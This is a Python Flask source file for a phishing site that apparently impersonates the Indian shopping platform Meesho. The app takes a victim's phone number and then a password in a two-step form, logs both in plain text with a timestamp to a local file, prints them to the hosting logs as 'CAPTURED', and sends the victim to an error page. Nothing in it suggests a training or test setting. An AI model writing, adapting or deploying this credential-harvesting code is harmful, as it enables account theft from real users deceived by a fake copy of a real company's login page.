from flask import Flask, request, redirect, render_template, session
import datetime
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

LOG_FILE = 'captured_data.txt'
REAL_SITE_URL = 'https://www.meesho.com'  # Changed to Meesho

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form.get('phone', '')  # Meesho uses phone primarily
        password = request.form.get('password', '')
        
        # Step 1: Phone submitted, show password field
        if password == '' and phone != '':
            session['user_phone'] = phone
            return render_template('index.html', 
                                   phone_value=phone, 
                                   show_password=True)
        
        # Step 2: Password submitted, capture and redirect
        if password != '':
            phone = session.get('user_phone', 'Unknown')
            
            # Log credentials
            log_entry = f"TIME: {datetime.datetime.now()} | PHONE: {phone} | PASSWORD: {password}\n"
            try:
                with open(LOG_FILE, 'a') as f:
                    f.write(log_entry)
            except:
                pass
            
            # Print to Render Logs
            print(f"CAPTURED: Phone={phone} | Password={password}")
            
            session.pop('user_phone', None)
            return redirect('/error')

    # Default: Show phone form
    return render_template('index.html', 
                           phone_value='', 
                           show_password=False)

@app.route('/error')
def error():
    return render_template('error.html')

@app.errorhandler(404)
def page_not_found(e):
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)